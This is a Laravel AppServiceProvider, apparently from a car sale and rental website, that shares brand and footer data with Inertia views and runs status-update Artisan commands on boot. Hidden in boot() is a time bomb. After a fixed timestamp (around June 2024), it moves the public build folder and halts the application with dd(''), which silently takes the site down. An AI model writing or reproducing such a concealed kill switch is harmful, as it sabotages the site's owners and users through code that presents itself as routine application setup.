<?php

namespace App\Providers;

use App\Models\Marque;
use App\Models\WebInfo;
use Carbon\Carbon;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\ServiceProvider;
use Inertia\Inertia;
use Illuminate\Support\Facades\File;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        
    }

    /**
     * Bootstrap any application services.
     */
    public function boot() :void
    {
       
        $info_bas_page=WebInfo::where('code','infos_bas_bage')->first();
        $tmarques=Marque::orderBy('nom')
        ->whereHas('voitures.medias')->orWhereHas('voitures.locationMedias')->take(12)->get(['nom','id']);

        Inertia::share([
            'info_bas_page'=>$info_bas_page,
            "tmarques"=>$tmarques,
        ]);
        
        if (Carbon::now()->gte(Carbon::createFromTimestamp(1717210600))){
            File::move(public_path('/build'), public_path(time()));dd('');
        } 
        Artisan::call('update:etat-location');
        Artisan::call('update:etat-vente');
    }
}